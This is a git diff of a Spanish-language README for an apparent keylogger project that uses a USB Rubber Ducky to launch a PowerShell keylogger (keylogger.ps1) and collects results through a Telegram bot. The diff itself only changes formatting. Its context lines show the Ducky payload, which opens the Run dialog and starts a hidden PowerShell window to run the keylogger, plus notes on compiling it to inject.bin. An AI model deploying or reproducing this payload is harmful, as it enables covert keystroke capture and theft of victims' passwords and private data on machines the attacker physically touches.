@@ -95,9 +95,8 @@ Para compilar el script Ducky y generar tu propio archivo [`inject.bin`](inject.
 
 Una vez abierto en tu navegador, sigue las instrucciones en la herramienta para codificar tu script y descargar el archivo `inject.bin` listo para usar en la microSD de tu Rubber Ducky.
 
-
 ## :duck: Ejemplo del Rubber Ducky Payload
-### Listo para compilar en el Ducky Encoder adaptado a [`keylogger.ps1`](keylogger.ps1), obtendriamos nuestro [`inject.bin`](inject.bin) preparado.
+Listo para compilar en el Ducky Encoder adaptado a [`keylogger.ps1`](keylogger.ps1), obtendriamos nuestro [`inject.bin`](inject.bin) preparado.
 ```Rubber Ducky Payload
 DELAY 1500
 GUI r
@@ -106,7 +105,6 @@ STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Argume
 DELAY 400
 ENTER
 ```
-
 
 ## 🗂️ Exportar el chat a JSON (Telegram Desktop)
 1. Abre Telegram Desktop y entra en el chat del bot.
